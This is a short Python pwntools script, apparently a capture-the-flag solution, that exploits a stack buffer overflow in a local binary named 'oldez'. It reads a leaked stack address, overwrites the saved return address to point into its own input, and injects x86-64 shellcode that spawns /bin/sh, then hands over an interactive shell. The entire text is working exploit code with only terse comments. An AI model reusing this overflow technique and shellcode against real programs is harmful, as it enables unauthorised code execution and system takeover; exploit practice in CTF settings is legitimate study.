from pwn import *
context.arch = 'amd64'

p = process("./oldez")

p.recvuntil('at ')
name = int(p.recvuntil(':', drop=True), 16)
success(f"name = {hex(name)}")

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

inp  = b"A" * 0x40          # fill up name
inp += b"B" * 0x08          # overwrite saved rbp (doesn't matter)
inp += p64(name + 0x50)     # overwrite saved return address to our shellcode
inp += shellcode            # our shellcode    

p.sendline(inp)
p.interactive()